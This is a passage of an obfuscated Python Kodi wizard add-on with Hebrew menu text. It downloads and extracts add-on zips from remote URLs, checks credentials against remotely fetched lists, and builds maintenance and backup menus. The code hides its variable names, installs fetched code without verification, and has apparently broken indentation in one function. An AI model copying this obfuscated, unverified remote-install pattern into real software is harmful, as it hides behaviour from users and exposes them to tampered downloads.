				for O0000O0O0000OOO0O ,O0000O0000OO0OOO0 ,O0O000OO000OOO00O ,OOOOOO00O0O000O00 ,O00O0O00000OOO000 ,OOOOO00OO0OO0O000 ,OO0OOOOOOOO00O0OO ,O000OO0OO00OOOO0O ,O000O00O0000OO00O in O0O0OOOO00O00O000 :#line:2527
					if os .path .exists (os .path .join (ADDONS ,O00O00OO0OO0O0OO0 )):#line:2528
						O00OOOOOO0O0OOOO0 =['Launch Addon','Remove Addon']#line:2529
						OO0OO0000O0O0O0OO =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,O00OOOOOO0O0OOOO0 )#line:2530
						if OO0OO0000O0O0O0OO ==0 :#line:2531
							wiz .ebi ('RunAddon(%s)'%O00O00OO0OO0O0OO0 )#line:2532
							xbmc .sleep (1000 )#line:2533
							return True #line:2534
						elif OO0OO0000O0O0O0OO ==1 :#line:2535
							wiz .cleanHouse (os .path .join (ADDONS ,O00O00OO0OO0O0OO0 ))#line:2536
							try :wiz .removeFolder (os .path .join (ADDONS ,O00O00OO0OO0O0OO0 ))#line:2537
							except :pass #line:2538
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O00O00OO0OO0O0OO0 ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2539
								removeAddonData (O00O00OO0OO0O0OO0 )#line:2540
							wiz .refresh ()#line:2541
							return True #line:2542
						else :#line:2543
							return False #line:2544
					OO000O0O0O0O000O0 =os .path .join (ADDONS ,O0O000OO000OOO00O )#line:2545
					if not O0O000OO000OOO00O .lower ()=='none'and not os .path .exists (OO000O0O0O0O000O0 ):#line:2546
						wiz .log ("Repository not installed, installing it")#line:2547
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,O00O00OO0OO0O0OO0 ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O0O000OO000OOO00O ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2548
							O0OOO00OOO0O000OO =wiz .parseDOM (wiz .openURL (OOOOOO00O0O000O00 ),'addon',ret ='version',attrs ={'id':O0O000OO000OOO00O })#line:2549
							if len (O0OOO00OOO0O000OO )>0 :#line:2550
								OOO00OOOOO00OOO0O ='%s%s-%s.zip'%(O00O0O00000OOO000 ,O0O000OO000OOO00O ,O0OOO00OOO0O000OO [0 ])#line:2551
								wiz .log (OOO00OOOOO00OOO0O )#line:2552
								if KODIV >=17 :wiz .addonDatabase (O0O000OO000OOO00O ,1 )#line:2553
								installAddon (O0O000OO000OOO00O ,OOO00OOOOO00OOO0O )#line:2554
								wiz .ebi ('UpdateAddonRepos()')#line:2555
								wiz .log ("Installing Addon from Kodi")#line:2557
								OO0OO0O000O0O00OO =installFromKodi (O00O00OO0OO0O0OO0 )#line:2558
								wiz .log ("Install from Kodi: %s"%OO0OO0O000O0O00OO )#line:2559
								if OO0OO0O000O0O00OO :#line:2560
									wiz .refresh ()#line:2561
									return True #line:2562
							else :#line:2563
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%O0O000OO000OOO00O )#line:2564
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(O00O00OO0OO0O0OO0 ,O0O000OO000OOO00O ))#line:2565
					elif O0O000OO000OOO00O .lower ()=='none':#line:2566
						wiz .log ("No repository, installing addon")#line:2567
						OOOO000OO00O0OO0O =O00O00OO0OO0O0OO0 #line:2568
						O00O0OO0OO00000O0 =O0000O0000OO0OOO0 #line:2569
						installAddon (O00O00OO0OO0O0OO0 ,O0000O0000OO0OOO0 )#line:2570
						wiz .refresh ()#line:2571
						return True #line:2572
					else :#line:2573
						wiz .log ("Repository installed, installing addon")#line:2574
						OO0OO0O000O0O00OO =installFromKodi (O00O00OO0OO0O0OO0 ,False )#line:2575
						if OO0OO0O000O0O00OO :#line:2576
							wiz .refresh ()#line:2577
							return True #line:2578
					if os .path .exists (os .path .join (ADDONS ,O00O00OO0OO0O0OO0 )):return True #line:2579
					O00O0OOOOO00O00O0 =wiz .parseDOM (wiz .openURL (OOOOOO00O0O000O00 ),'addon',ret ='version',attrs ={'id':O00O00OO0OO0O0OO0 })#line:2580
					if len (O00O0OOOOO00O00O0 )>0 :#line:2581
						O0000O0000OO0OOO0 ="%s%s-%s.zip"%(O0000O0000OO0OOO0 ,O00O00OO0OO0O0OO0 ,O00O0OOOOO00O00O0 [0 ])#line:2582
						wiz .log (str (O0000O0000OO0OOO0 ))#line:2583
						if KODIV >=17 :wiz .addonDatabase (O00O00OO0OO0O0OO0 ,1 )#line:2584
						installAddon (O00O00OO0OO0O0OO0 ,O0000O0000OO0OOO0 )#line:2585
						wiz .refresh ()#line:2586
					else :#line:2587
						wiz .log ("no match");return False #line:2588
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2589
		else :wiz .log ("[Addon Installer] Text File: %s"%O000O00OO00O0000O )#line:2590
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2591
def installFromKodi (O000OO00OO000OO00 ,over =True ):#line:2593
	if over ==True :#line:2594
		xbmc .sleep (2000 )#line:2595
	wiz .ebi ('RunPlugin(plugin://%s)'%O000OO00OO000OO00 )#line:2597
	if not wiz .whileWindow ('yesnodialog'):#line:2598
		return False #line:2599
	xbmc .sleep (1000 )#line:2600
	if wiz .whileWindow ('okdialog'):#line:2601
		return False #line:2602
	wiz .whileWindow ('progressdialog')#line:2603
	if os .path .exists (os .path .join (ADDONS ,O000OO00OO000OO00 )):return True #line:2604
	else :return False #line:2605
def installAddon (OOO0OO0O00O0O0O00 ,O0OO0OOOO0OOOO0OO ):#line:2607
	if not wiz .workingURL (O0OO0OOOO0OOOO0OO )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,OOO0OO0O00O0O0O00 ,COLOR2 ));return #line:2608
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2609
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0OO0O00O0O0O00 ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2610
	OOO00O00OOO0O000O =O0OO0OOOO0OOOO0OO .split ('/')#line:2611
	O0OOO0OOOO0O000O0 =os .path .join (PACKAGES ,OOO00O00OOO0O000O [-1 ])#line:2612
	try :os .remove (O0OOO0OOOO0O000O0 )#line:2613
	except :pass #line:2614
	downloader .download (O0OO0OOOO0OOOO0OO ,O0OOO0OOOO0O000O0 ,DP )#line:2615
	O00OOO00OOO0OO000 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0OO0O00O0O0O00 )#line:2616
	DP .update (0 ,O00OOO00OOO0OO000 ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2617
	OO000OO0OOO00OOO0 ,O00OO0O0000OO0O00 ,OOOO00O0O00O00OOO =extract .all (O0OOO0OOOO0O000O0 ,ADDONS ,DP ,title =O00OOO00OOO0OO000 )#line:2618
	DP .update (0 ,O00OOO00OOO0OO000 ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2619
	installed (OOO0OO0O00O0O0O00 )#line:2620
	installDep (OOO0OO0O00O0O0O00 ,DP )#line:2621
	DP .close ()#line:2622
	wiz .ebi ('UpdateAddonRepos()')#line:2623
	wiz .ebi ('UpdateLocalAddons()')#line:2624
	wiz .refresh ()#line:2625
def installDep (OO00OO0OOO00O0O00 ,DP =None ):#line:2627
	OO00O0000OO0OOO00 =os .path .join (ADDONS ,OO00OO0OOO00O0O00 ,'addon.xml')#line:2628
	if os .path .exists (OO00O0000OO0OOO00 ):#line:2629
		O000000O00O0OOO00 =open (OO00O0000OO0OOO00 ,mode ='r');O0OOOO00000OOO00O =O000000O00O0OOO00 .read ();O000000O00O0OOO00 .close ();#line:2630
		O0OO0O0O00O000000 =wiz .parseDOM (O0OOOO00000OOO00O ,'import',ret ='addon')#line:2631
		for O0OO00OOO00000OO0 in O0OO0O0O00O000000 :#line:2632
			if not 'xbmc.python'in O0OO00OOO00000OO0 :#line:2633
				if not DP ==None :#line:2634
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,O0OO00OOO00000OO0 ))#line:2635
				wiz .createTemp (O0OO00OOO00000OO0 )#line:2636
def installed (O00O0O0OO0OOO00O0 ):#line:2663
	O0O00O00O000OO000 =os .path .join (ADDONS ,O00O0O0OO0OOO00O0 ,'addon.xml')#line:2664
	if os .path .exists (O0O00O00O000OO000 ):#line:2665
		try :#line:2666
			OO000OO0O00O0O000 =open (O0O00O00O000OO000 ,mode ='r');O0OOO00000OO0OO00 =OO000OO0O00O0O000 .read ();OO000OO0O00O0O000 .close ()#line:2667
			O0O00O00O00OOO0O0 =wiz .parseDOM (O0OOO00000OO0OO00 ,'addon',ret ='name',attrs ={'id':O00O0O0OO0OOO00O0 })#line:2668
			OO00OOO0000OOOO0O =os .path .join (ADDONS ,O00O0O0OO0OOO00O0 ,'icon.png')#line:2669
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,O0O00O00O00OOO0O0 [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',OO00OOO0000OOOO0O )#line:2670
		except :pass #line:2671
def youtubeMenu (url =None ):#line:2673
	if not YOUTUBEFILE =='http://':#line:2674
		if url ==None :#line:2675
			O0O0O0000OOOO00OO =wiz .workingURL (YOUTUBEFILE )#line:2676
			OOO0OO0O00000OOO0 =uservar .YOUTUBEFILE #line:2677
		else :#line:2678
			O0O0O0000OOOO00OO =wiz .workingURL (url )#line:2679
			OOO0OO0O00000OOO0 =url #line:2680
		if O0O0O0000OOOO00OO ==True :#line:2681
			O0000000OOO000000 =wiz .openURL (OOO0OO0O00000OOO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2682
			O00O0OO00O00O00OO =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0000000OOO000000 )#line:2683
			if len (O00O0OO00O00O00OO )>0 :#line:2684
				for O0OO00OOO000O000O ,O00OO0O00OO0000OO ,url ,O000O0OO0OOOOOO00 ,O0OOO00000O0O0OOO ,OO0O0OOOO00O00O00 in O00O0OO00O00O00OO :#line:2685
					if O00OO0O00OO0000OO .lower ()=="yes":#line:2686
						addDir ("[B]%s[/B]"%O0OO00OOO000O000O ,'youtube',url ,description =OO0O0OOOO00O00O00 ,icon =O000O0OO0OOOOOO00 ,fanart =O0OOO00000O0O0OOO ,themeit =THEME3 )#line:2687
					else :#line:2688
						addFile (O0OO00OOO000O000O ,'viewVideo',url =url ,description =OO0O0OOOO00O00O00 ,icon =O000O0OO0OOOOOO00 ,fanart =O0OOO00000O0O0OOO ,themeit =THEME2 )#line:2689
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:2690
		else :#line:2691
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:2692
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2693
			addFile ('%s'%O0O0O0000OOOO00OO ,'',themeit =THEME3 )#line:2694
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:2695
	setView ('files','viewType')#line:2696
def STARTP ():#line:2697
	O00000O0OOOOOOOOO =(ADDON .getSetting ("pass"))#line:2698
	if BUILDNAME =="":#line:2699
	 if not NOTIFY =='true':#line:2700
          O000OO0O00OOOO0O0 =wiz .workingURL (NOTIFICATION )#line:2701
	 if not NOTIFY2 =='true':#line:2702
          O000OO0O00OOOO0O0 =wiz .workingURL (NOTIFICATION2 )#line:2703
	 if not NOTIFY3 =='true':#line:2704
          O000OO0O00OOOO0O0 =wiz .workingURL (NOTIFICATION3 )#line:2705
	O0OOO0OO0OOOOO0O0 =O00000O0OOOOOOOOO #line:2706
	O000OO0O00OOOO0O0 =urllib2 .Request (SPEED )#line:2707
	O0OO0O00OOO000O00 =urllib2 .urlopen (O000OO0O00OOOO0O0 )#line:2708
	OOOO0O0O0OOOO0000 =O0OO0O00OOO000O00 .readlines ()#line:2710
	OO000OOO00OO0O000 =0 #line:2714
	for OOO0000OOO0O0OO0O in OOOO0O0O0OOOO0000 :#line:2715
		if OOO0000OOO0O0OO0O .split (' ==')[0 ]==O00000O0OOOOOOOOO or OOO0000OOO0O0OO0O .split ()[0 ]==O00000O0OOOOOOOOO :#line:2716
			OO000OOO00OO0O000 =1 #line:2717
			break #line:2718
	if OO000OOO00OO0O000 ==0 :#line:2719
					OO00OOO00000O0000 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2720
					if OO00OOO00000O0000 :#line:2722
						ADDON .openSettings ()#line:2724
						sys .exit ()#line:2726
					else :#line:2727
						sys .exit ()#line:2728
	return 'ok'#line:2732
def STARTP2 ():#line:2733
	OOO000OOOO000OOOO =(ADDON .getSetting ("user"))#line:2734
	O0O0O00O0O0O00000 =(UNAME )#line:2736
	OO00OO00OO00OO000 =urllib2 .urlopen (O0O0O00O0O0O00000 )#line:2737
	OOOO0O0000OO0OO0O =OO00OO00OO00OO000 .readlines ()#line:2738
	O000OOO0OO0O00000 =0 #line:2739
	for O0O000000OO00O0OO in OOOO0O0000OO0OO0O :#line:2742
		if O0O000000OO00O0OO .split (' ==')[0 ]==OOO000OOOO000OOOO or O0O000000OO00O0OO .split ()[0 ]==OOO000OOOO000OOOO :#line:2743
			O000OOO0OO0O00000 =1 #line:2744
			break #line:2745
	if O000OOO0OO0O00000 ==0 :#line:2746
		OO0OO0OO0OOOOOOOO =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2747
		if OO0OO0OO0OOOOOOOO :#line:2749
			ADDON .openSettings ()#line:2751
			sys .exit ()#line:2754
		else :#line:2755
			sys .exit ()#line:2756
	return 'ok'#line:2760
def passandpin ():#line:2761
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:2762
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:2763
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:2764
def passandUsername ():#line:2765
	ADDON .openSettings ()#line:2767
def folderback ():#line:2770
    O00O00O00O0O00000 =ADDON .getSetting ("path")#line:2771
    if O00O00O00O0O00000 :#line:2772
      O00O00O00O0O00000 =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:2773
      ADDON .setSetting ("path",O00O00O00O0O00000 )#line:2774
def backmyupbuild ():#line:2777
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2781
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2782
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2783
		addFile ('גיבוי הגדרות סקין ותפריטים בלבד','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2785
		addFile ('גיבוי הגדרות של הרחבות כולל תפריטים וסיסמאות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2786
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2787
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2789
def maintMenu (view =None ):#line:2793
	OOOOO0O0OO0OO0OOO ='[B][COLOR green]ON[/COLOR][/B]';OOOOO00OO00OO0O00 ='[B][COLOR red]OFF[/COLOR][/B]'#line:2795
	OOO0O0OO0OO00O0O0 ='true'if AUTOCLEANUP =='true'else 'false'#line:2796
	O0OOO0O00O00O000O ='true'if AUTOCACHE =='true'else 'false'#line:2797
	O000000O000000000 ='true'if AUTOPACKAGES =='true'else 'false'#line:2798
	OO00O0000O000OOOO ='true'if AUTOTHUMBS =='true'else 'false'#line:2799
	OO000O0OOO00O0OO0 ='true'if SHOWMAINT =='true'else 'false'#line:2800
	O00O00OO0O00OOO0O ='true'if INCLUDEVIDEO =='true'else 'false'#line:2801
	OO0OOO00000OO0000 ='true'if INCLUDEALL =='true'else 'false'#line:2802
	O0O0O0O00O000OOO0 ='true'if THIRDPARTY =='true'else 'false'#line:2803
	if wiz .Grab_Log (True )==False :O00OO0O00OOOO0OOO =0 #line:2804
	else :O00OO0O00OOOO0OOO =errorChecking (wiz .Grab_Log (True ),True ,True )#line:2805
	if wiz .Grab_Log (True ,True )==False :O0OOOO0OO000000O0 =0 #line:2806
	else :O0OOOO0OO000000O0 =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:2807
	O0000000OOO0OOO0O =int (O00OO0O00OOOO0OOO )+int (O0OOOO0OO000000O0 )#line:2808
	O000OO0000OOOO0OO =str (O0000000OOO0OOO0O )+' Error(s) Found'if O0000000OOO0OOO0O >0 else 'None Found'#line:2809
	OO00OOO00O00O0O00 =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:2810
	if OO0OOO00000OO0000 =='true':#line:2811
		O000OO0000O0OOOOO ='true'#line:2812
		O0OOOO0O0OOO0O000 ='true'#line:2813
		O00OOOO00O0O00OO0 ='true'#line:2814
		O00OOO00O0O00O0O0 ='true'#line:2815
		OO0O000O0000000OO ='true'#line:2816
		O0O0OOOOOO00O0O00 ='true'#line:2817
		OO0OOOOOO0O00OO00 ='true'#line:2818
		O0O0000OOO00OO00O ='true'#line:2819
	else :#line:2820
		O000OO0000O0OOOOO ='true'if INCLUDEBOB =='true'else 'false'#line:2821
		O0OOOO0O0OOO0O000 ='true'if INCLUDEPHOENIX =='true'else 'false'#line:2822
		O00OOOO00O0O00OO0 ='true'if INCLUDESPECTO =='true'else 'false'#line:2823
		O00OOO00O0O00O0O0 ='true'if INCLUDEGENESIS =='true'else 'false'#line:2824
		OO0O000O0000000OO ='true'if INCLUDEEXODUS =='true'else 'false'#line:2825
		O0O0OOOOOO00O0O00 ='true'if INCLUDEONECHAN =='true'else 'false'#line:2826
		OO0OOOOOO0O00OO00 ='true'if INCLUDESALTS =='true'else 'false'#line:2827
		O0O0000OOO00OO00O ='true'if INCLUDESALTSHD =='true'else 'false'#line:2828
	O0O00000O0O0O0OO0 =wiz .getSize (PACKAGES )#line:2829
	OO0000O00O0000OOO =wiz .getSize (THUMBS )#line:2830
	OOO0O00O000OOO0OO =wiz .getCacheSize ()#line:2831
	OO0OO0OOO0O0OOOO0 =O0O00000O0O0O0OO0 +OO0000O00O0000OOO +OOO0O00O000OOO0OO #line:2832
	OOOO00O0O000OO000 =['Daily','Always','3 Days','Weekly']#line:2833
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:2834
	if view =="clean"or SHOWMAINT =='true':#line:2835
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO0OO0OOO0O0OOOO0 ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:2836
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOO0O00O000OOO0OO ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2837
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0O00000O0O0O0OO0 ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2838
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO0000O00O0000OOO ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:2839
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2840
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:2841
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:2842
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:2843
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:2844
	if view =="addon"or SHOWMAINT =='false':#line:2845
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2846
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:2847
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2848
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:2849
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2850
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2851
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2852
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:2853
	if view =="misc"or SHOWMAINT =='true':#line:2854
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:2855
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:2856
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:2857
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:2858
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:2859
		addFile ('View Errors in Log: %s'%(O000OO0000OOOO0OO ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:2860
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:2861
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2862
		addFile ('Clear Wizard Log File%s'%OO00OOO00O00O0O00 ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2863
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:2864
	if view =="backup"or SHOWMAINT =='true':#line:2865
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2866
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2867
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2868
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:2869
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2870
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2871
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2872
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:2873
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2874
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:2875
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:2876
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2877
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:2878
	if view =="tweaks"or SHOWMAINT =='true':#line:2879
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:2880
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:2881
		else :#line:2882
			if os .path .exists (ADVANCED ):#line:2883
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2884
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2885
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2886
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:2887
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:2888
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2889
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:2890
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:2891
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:2892
	addFile ('Show All Maintenance: %s'%OO000O0OOO00O0OO0 .replace ('true',OOOOO0O0OO0OO0OOO ).replace ('false',OOOOO00OO00OO0O00 ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:2893
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:2894
	addFile ('Third Party Wizards: %s'%O0O0O0O00O000OOO0 .replace ('true',OOOOO0O0OO0OO0OOO ).replace ('false',OOOOO00OO00OO0O00 ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2895
	if O0O0O0O00O000OOO0 =='true':#line:2896
		OOOOO0O000000OOOO =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:2897
		OOOO0OO0O00O00OO0 =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:2898
		OOO000000000OO000 =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:2899
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OOOOO0O000000OOOO ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:2900
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OOOO0OO0O00O00OO0 ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:2901
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OOO000000000OO000 ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:2902
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2903
	addFile ('ניקוי אוטומטי בהפעלה: %s'%OOO0O0OO0OO00O0O0 .replace ('true',OOOOO0O0OO0OO0OOO ).replace ('false',OOOOO00OO00OO0O00 ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:2904
	if OOO0O0OO0OO00O0O0 =='true':#line:2905
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%OOOO00O0O000OO000 [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:2906
		addFile ('--- ניקוי קאש בהפעלה: %s'%O0OOO0O00O00O000O .replace ('true',OOOOO0O0OO0OO0OOO ).replace ('false',OOOOO00OO00OO0O00 ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2907
		addFile ('--- ניקוי חבילות בהפעלה: %s'%O000000O000000000 .replace ('true',OOOOO0O0OO0OO0OOO ).replace ('false',OOOOO00OO00OO0O00 ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2908
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%OO00O0000O000OOOO .replace ('true',OOOOO0O0OO0OO0OOO ).replace ('false',OOOOO00OO00OO0O00 ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2909
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2910
	addFile ('Include Video Cache in Clear Cache: %s'%O00O00OO0O00OOO0O .replace ('true',OOOOO0O0OO0OO0OOO ).replace ('false',OOOOO00OO00OO0O00 ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:2911
	if O00O00OO0O00OOO0O =='true':#line:2912
